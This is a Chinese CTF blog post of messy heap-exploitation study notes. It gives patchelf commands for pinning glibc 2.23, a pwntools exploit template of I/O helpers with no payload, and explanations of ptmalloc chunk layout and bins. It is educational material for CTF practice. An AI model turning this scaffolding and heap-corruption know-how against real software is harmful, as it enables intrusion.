<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Torebtr,2338442533@qq.com"><meta name="copyright" content="Torebtr"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>heap学习(乱) | Torebtr'blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"torebtr.github.io","root":"/","title":"TOR的小站","version":"1.5.1","mode":"auto","copycode":true,"page":{"isPost":true},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Torebtr'blog" type="application/atom+xml"><meta name="description" content="堆学习记录这一块只是随便记一下，写的特别乱，如果有需要可以自己翻阅 patchelf使用patchelf --replace-needed libc.so.6 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;2.23-0ubuntu11.3_amd64&#x2F;libc-2.23.so .&#x2F;pwn  patchelf --set-interpreter ld-2.23.so --set-rpath &#x2F;lib&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="heap学习(乱)">
<meta property="og:url" content="https://torebtr.github.io/2021/08/31/heap-%E4%B9%B1/index.html">
<meta property="og:site_name" content="Torebtr&#39;blog">
<meta property="og:description" content="堆学习记录这一块只是随便记一下，写的特别乱，如果有需要可以自己翻阅 patchelf使用patchelf --replace-needed libc.so.6 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;2.23-0ubuntu11.3_amd64&#x2F;libc-2.23.so .&#x2F;pwn  patchelf --set-interpreter ld-2.23.so --set-rpath &#x2F;lib&#x2F;">
<meta property="og:locale">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210728150603897.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20200410184734763.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20200410191700386.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20181129113443346.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20181129113608304.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210131225707728.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210131225918028.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316193205171.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316193246990.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316195712928.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20210316194820280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316194820280.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316200716695.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210410162550132.png">
<meta property="og:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210410162636851.png">
<meta property="article:published_time" content="2021-08-31T06:28:26.000Z">
<meta property="article:modified_time" content="2021-08-31T06:34:37.693Z">
<meta property="article:author" content="Torebtr">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210728150603897.png"><script src="/js/ui/mode.js"></script>
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Torebtr"><img width="96" loading="lazy" src="/6.jpg" alt="Torebtr"></a><div class="site-author-name"><a href="/about/">Torebtr</a></div><a class="site-name" href="/about/site.html">Torebtr'blog</a><sub class="site-subtitle"></sub><div class="site-desciption">一只从pwn走向全栈的菜鸡</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://wiki.x10sec.org/" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Torebtr" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/u/7466379217" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=1477978576" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/torebtr" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/435886015" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="2338442533@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">堆学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#patchelf%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">patchelf使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.2.</span> <span class="toc-text">exp模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%85%A5%E9%97%A8"><span class="toc-number">1.3.</span> <span class="toc-text">堆入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin"><span class="toc-number">1.3.1.</span> <span class="toc-text">fastbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsortedbin"><span class="toc-number">1.3.2.</span> <span class="toc-text">unsortedbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-size%EF%BC%9A"><span class="toc-number">1.3.3.</span> <span class="toc-text">pre_size：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk-size"><span class="toc-number">1.3.4.</span> <span class="toc-text">chunk_size:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mem%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">mem：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%EF%BC%9A"><span class="toc-number">1.3.6.</span> <span class="toc-text">大小：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E9%97%B2%E7%AE%A1%E7%90%86%E5%88%97%E8%A1%A8-bin"><span class="toc-number">1.4.</span> <span class="toc-text">空闲管理列表(bin):</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbins"><span class="toc-number">1.4.1.</span> <span class="toc-text">fastbins:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">unsorted bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small-bins-large-bins"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">small bins, large bins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Small-Bin%C2%B6"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">Small Bin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%A0%86%E5%88%86%E9%85%8D%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.2.</span> <span class="toc-text">寻找堆分配函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#realloc-malloc-calloc"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">realloc malloc calloc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">free函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptmalloc-%E7%9A%84%E5%93%8D%E5%BA%94"><span class="toc-number">1.4.4.</span> <span class="toc-text">ptmalloc 的响应</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">危险函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">确定填充长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HOF"><span class="toc-number">1.5.</span> <span class="toc-text">HOF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-arena"><span class="toc-number">1.6.</span> <span class="toc-text">main_arena</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-bin"><span class="toc-number">1.7.</span> <span class="toc-text">Fast bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsort-bin"><span class="toc-number">1.8.</span> <span class="toc-text">Unsort bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#off-by-one-%E5%8D%95%E5%AD%97%E8%8A%82%E6%BA%A2%E5%87%BA"><span class="toc-number">1.9.</span> <span class="toc-text">off by one:单字节溢出</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#struct-pack-format-v1-v2-%E2%80%A6"><span class="toc-number">2.</span> <span class="toc-text">**struct.pack(****format***, *v1*, *v2*, *…***)***</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bamboobox"><span class="toc-number">3.</span> <span class="toc-text">bamboobox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">3.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">3.2.</span> <span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021V-amp-Nctf%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">2021V&amp;Nctf：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#White-Give-Flag%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">White_Give_Flag：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ff"><span class="toc-number">4.2.</span> <span class="toc-text">ff</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.1.</span> <span class="toc-text">UAF漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-1"><span class="toc-number">5.</span> <span class="toc-text">fastbin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%B2%99%E7%AE%B1"><span class="toc-number">6.</span> <span class="toc-text">linux沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-seccomp"><span class="toc-number">6.1.</span> <span class="toc-text">linux seccomp</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://torebtr.github.io/2021/08/31/heap-%E4%B9%B1/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Torebtr,2338442533@qq.com"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Torebtr'blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">heap学习(乱)</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2021-08-31 14:28:26" itemprop="dateCreated datePublished" datetime="2021-08-31T14:28:26+08:00">2021-08-31</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/heap/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">heap</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="堆学习记录"><a href="#堆学习记录" class="headerlink" title="堆学习记录"></a>堆学习记录</h1><p>这一块只是随便记一下，写的特别乱，如果有需要可以自己翻阅</p>
<h2 id="patchelf使用"><a href="#patchelf使用" class="headerlink" title="patchelf使用"></a>patchelf使用</h2><pre class="language-sh" data-language="sh"><code class="language-sh">patchelf --replace-needed libc.so.6 /lib/x86_64-linux-gnu/2.23-0ubuntu11.3_amd64/libc-2.23.so ./pwn

patchelf --set-interpreter ld-2.23.so --set-rpath /lib/x86_64-linux-gnu/2.23-0ubuntu11.3_amd64 ./pwn</code></pre>



<h2 id="exp模板"><a href="#exp模板" class="headerlink" title="exp模板"></a>exp模板</h2><pre class="language-python" data-language="python"><code class="language-python"># encoding=utf-8
from pwn import *
from LibcSearcher import *
s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
shell = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
 
libc_path = "/lib/x86_64-linux-gnu/libc-2.23.so"
elf_path = "./2a1"
ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
libc = ELF(libc_path)
elf = ELF(elf_path)

#p = remote("node3.buuoj.cn",26000)
context.log_level = 'debug'
#p = process([elf_path],env={"LD_PRELOAD":libc_path})</code></pre>







<h2 id="堆入门"><a href="#堆入门" class="headerlink" title="堆入门"></a>堆入门</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/97613588">https://blog.csdn.net/qq_41453285/article/details/97613588</a></p>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><em><strong>fastbins为单链表存储。unsortedbin、smallbins、largebins都是双向循环链表存储。</strong></em></p>
<p><em><strong>并且free掉的chunk，如果大小在0x20~0x80之间会直接放到fastbins上去，大于0x80的会放到unsortedbin上，然后进行整理。</strong></em></p>
<p>fastbins是单向链表存储</p>
<p><strong>fastbins的存储采用后进先出（LIFO）的原则：</strong>后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的。</p>
<p>fastbins中的所有chunk的bk是没有用到的</p>
<p>并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210728150603897.png" alt="image-20210728150603897" loading="lazy"></p>
<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ul>
<li>free的chunk大小如果大于0x80会放到unsortedbin上。</li>
<li>unsortedbin存储这些chunk是使用双向循环链表进行存储的</li>
</ul>
<pre class="language-none"><code class="language-none">// 一个 chunk 的完整结构体
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};</code></pre>

<pre class="language-none"><code class="language-none">// 正在使用的 chunk 布局
    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |             Size of previous chunk, if allocated            | |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |             Size of chunk, in bytes                       |M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |             User data starts here...                          .
      .                                                               .
      .             (malloc_usable_size() bytes)                      .
      .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |             Size of chunk                                     |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre>



<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20200410184734763.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>由malloc申请的内存空间被称作chunk,而当程序申请的chunk被free时会被加入到相应的空闲管理列表(bin)中</p>
<h3 id="pre-size："><a href="#pre-size：" class="headerlink" title="pre_size："></a>pre_size：</h3><p>前一个chunk块的大小，如果chunk_size的P位为1则pre_size无效，上个chunk可以使用pre_size的空间。（前一个chunk块的大小，指的是低地址的chunk）</p>
<h3 id="chunk-size"><a href="#chunk-size" class="headerlink" title="chunk_size:"></a>chunk_size:</h3><p>当前chunk的大小，由于chunk是8字节对齐的，所以后3位分别为，A(是否为main_arena,即主线程)、M(该chunk是否由mmap分配)，P(前一个chunk是否被分配，故经常会看到chunk_size比chunk大1字节)。</p>
<h3 id="mem："><a href="#mem：" class="headerlink" title="mem："></a>mem：</h3><p>用户申请的空间，即malloc 申请得到的内存指针，其实指向 mem 的起始处。chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<br>fd 指向下一个（非物理相邻）空闲的 chunk<br>bk 指向上一个（非物理相邻）空闲的 chunk<br>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</p>
<h3 id="大小："><a href="#大小：" class="headerlink" title="大小："></a>大小：</h3><p>Chunk的大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是<br>2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
<p>故在32位中最小的chunk(min_size)的大小为：8+4+4=16字节,其中8字节为用户使用的空间，4字节为pre_size,4字节为chunk_size</p>
<p>64位为：16+8+8=32字,16字节为用户使用的空间，8字节为pre_size,8字节为chunk_size（最小的chunk意味着只要用户申请的size小于min_size，得到的空间都为min_size）</p>
<p><em><strong>请求分配 chunk 大小分配公式是 <code>chunk_size = (用户请求大小 + (2 - 1) * sizeof(INTERNAL_SIZE_T)) align to 2 * sizeof(size_t)</code></strong></em></p>
<h2 id="空闲管理列表-bin"><a href="#空闲管理列表-bin" class="headerlink" title="空闲管理列表(bin):"></a>空闲管理列表(bin):</h2><p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc会统一管理 heap 和 mmap 映射区域中的空闲的chunk。在具体的实现中，ptmalloc 采用分箱式方法对空闲的chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为4类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的chunk。在这里我们主要学习的两种bin：fastbins和unsorted bin。</p>
<ul>
<li><strong>astbinY数组：</strong>大小为10。记录的是fast bin链</li>
<li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2<del>63）、large bin链（64</del>126）</li>
</ul>
<h3 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins:"></a>fastbins:</h3><p>fast bin的个数——10个</p>
<p>每个fast bin都是一个<strong>单链表</strong>(只使用fd指针)</p>
<p>glibc以单链表结构对其进行管理，且每个bin采取的是LIFO（后进先出，跟栈类似）的策略，即最近释放的chunk会被优先分配，同时fastbin中的chunk的P位设为1，不会进行合并操作。</p>
<p>fastbin大小（注：以下的大小都为mem的大小，实际chunk的空间还要加上chunk_head（64位为16字节，32位为8字节）)</p>
<p>fastbins中最多有10个bin：<br><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20200410191700386.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>chunk的大小在32字节<del>128字节（0x20</del>0x80）的chunk称为“fast chunk”（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）·</p>
<ul>
<li><p>每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作</p>
</li>
<li><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>只有一个 unsorted bin, 进行内存分配查找时先在 Fastbins, small bins 中查找, 之后会在 unsorted bin 中进行查找, 并整理 unsorted bin 中所有的 chunk 到 Bins 中对应的 Bin. unsorted bin 位于 <code>bin[1]</code>.</p>
<p><code>unsorted_bin-&gt;fd</code> 指向双向环链表的头结点, <code>unsorted_bin-&gt;bk</code> 指向双向环链表的尾节点, 在头部插入新的节点.</p>
<p>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO </p>
<h4 id="small-bins-large-bins"><a href="#small-bins-large-bins" class="headerlink" title="small bins, large bins"></a>small bins, large bins</h4><h4 id="Small-Bin¶"><a href="#Small-Bin¶" class="headerlink" title="Small Bin¶"></a>Small Bin<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/heap_structure/#small-bin">¶</a></h4><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th align="left">下标</th>
<th align="left">SIZE_SZ=4（32 位）</th>
<th align="left">SIZE_SZ=8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
<td align="left">16</td>
<td align="left">32</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">24</td>
<td align="left">48</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">32</td>
<td align="left">64</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">40</td>
<td align="left">80</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">2<em>4</em>x</td>
<td align="left">2<em>8</em>x</td>
</tr>
<tr>
<td align="left">63</td>
<td align="left">504</td>
<td align="left">1008</td>
</tr>
</tbody></table>
<p>对于 chunk <code>size &lt; 512</code>, 是存放在 small bins, 有 64 个, 每个 bin 是以 8 bytes 作为分割边界, 也就相当于等差序列, 举个例子: small bins 中存放的第一个 <code>chunk 双向环链表</code> 全部都是由 size 为 16 bytes 大小的 chunk 组成的, 第二个 <code>chunk 双向环链表</code> 都是由 size 为 16+8 bytes 大小的 chunk 组成的. 但是对于 large bins, 分割边界是递增的, 举个简单例子: 前 32 个 large bins 的分割边界都是 64 bytes, 之后 16 个 large bins 的分割边界是 512 bytes. 以上仅为字长为 32 位的情况下, 具体请参考如下.</p>
<pre class="language-none"><code class="language-none">eglibc-2.19/malloc/malloc.c:1436
/*
   Indexing

    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced
    8 bytes apart. Larger bins are approximately logarithmically spaced:

    64 bins of size       8
    32 bins of size      64
    16 bins of size     512
     8 bins of size    4096
     4 bins of size   32768
     2 bins of size  262144
     1 bin  of size what's left

    There is actually a little bit of slop in the numbers in bin_index
    for the sake of speed. This makes no difference elsewhere.

    The bins top out around 1MB because we expect to service large
    requests via mmap.

    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be
    a valid chunk size the small bins are bumped up one.
 */</code></pre></li>
</ul>
<p>top chunk 位于最高地址.</p>
